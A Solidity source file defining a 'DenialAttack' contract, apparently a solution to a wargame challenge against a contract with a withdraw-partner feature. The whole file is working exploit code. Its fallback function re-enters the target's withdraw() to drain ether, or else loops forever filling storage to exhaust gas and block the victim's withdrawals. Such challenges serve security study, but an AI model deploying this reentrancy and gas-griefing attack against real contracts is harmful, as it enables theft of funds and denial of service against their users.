pragma solidity ^0.6.0;

import "hardhat/console.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract DenialAttack {
    IDenial target;
    bytes32[] trash;
    bool withdraw = false;

    function attack(address _target) public {
        withdraw = true;

        target = IDenial(_target);

        target.setWithdrawPartner(address(this));
        target.withdraw();

        msg.sender.call{value: (address(this).balance)}("");

        withdraw = false;
    }

    fallback() external payable {
        if (withdraw) {
            target.withdraw();
        } else {
            while (true) {
                trash.push(bytes32(uint256(2**256 - 1)));
            }
        }
    }
}
